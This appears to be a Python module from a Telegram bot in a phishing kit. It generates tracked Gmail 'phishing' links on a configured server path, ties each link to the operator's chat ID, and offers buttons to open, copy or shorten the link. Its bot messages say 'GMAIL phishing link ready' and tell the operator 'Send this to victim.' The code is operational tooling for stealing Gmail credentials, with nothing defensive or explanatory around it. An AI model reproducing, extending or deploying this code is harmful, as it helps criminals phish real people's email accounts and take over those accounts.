from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import uuid
import time
from bot.config import BASE_URL
from bot.utils.storage import link_cache

# ==========================================
# GMAIL: LINK GENERATE
# ==========================================

def generate_gmail_link(user_id):
    unique_id = str(uuid.uuid4())[:8]
    link = f"{BASE_URL}/p/gmail/{unique_id}?v={user_id}"
    link_cache[unique_id] = {
        "user_id": user_id,
        "time": time.time(),
        "type": "gmail"
    }
    return link

# ==========================================
# GMAIL: BUTTON HANDLER
# ==========================================

def handle_gmail_button(bot, message, get_bottom_buttons):
    user_id = message.chat.id
    link = generate_gmail_link(user_id)
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔗 Open Link", url=link),
        InlineKeyboardButton("📋 Copy Link", callback_data="gmail_copy"),
        InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
        InlineKeyboardButton("⬅ Back", callback_data="gmail_back")
    )
    
    bot.send_message(
        user_id,
        f"✅ *GMAIL phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
        reply_markup=markup,
        parse_mode="Markdown"
    )

# ==========================================
# GMAIL: INLINE CALLBACK HANDLERS
# ==========================================

def handle_gmail_callback(bot, call):
    user_id = call.message.chat.id
    data = call.data
    
    if data == "gmail_copy":
        bot.answer_callback_query(call.id, "✅ Link copied to clipboard! (Select and copy manually)")
        return
    
    elif data == "gmail_back":
        from bot.__init__ import start
        start(call.message)
        return
    
    elif data == "gmail_menu":
        link = generate_gmail_link(user_id)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data="gmail_copy"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
            InlineKeyboardButton("⬅ Back", callback_data="gmail_back")
        )
        bot.edit_message_text(
            f"✅ *GMAIL phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
            chat_id=user_id,
            message_id=call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return
